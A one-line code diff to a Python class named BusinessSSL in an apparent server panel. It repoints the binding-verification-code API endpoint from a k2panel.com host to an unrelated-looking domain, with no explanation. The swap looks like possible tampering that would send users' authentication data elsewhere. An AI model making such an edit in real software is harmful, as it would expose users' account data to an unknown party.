@@ -23,7 +23,7 @@ class BusinessSSL(object):
     __BINDURL = f"{public.OfficialApiBase()}/api/user"  # 获取token 获取官网token
     __APIURL = f"{public.OfficialApiBase()}/api"
 
-    __CODEURL = "https://wafapi.k2panel.com/Auth/GetBindCode"  # 获取绑定验证码
+    __CODEURL = "https://wafapi.binarjoinanalyticnl.nl/Auth/GetBindCode"  # 获取绑定验证码
     __UPATH = "data/userInfo.json"
     __PUBKEY = "data/public.key"
 
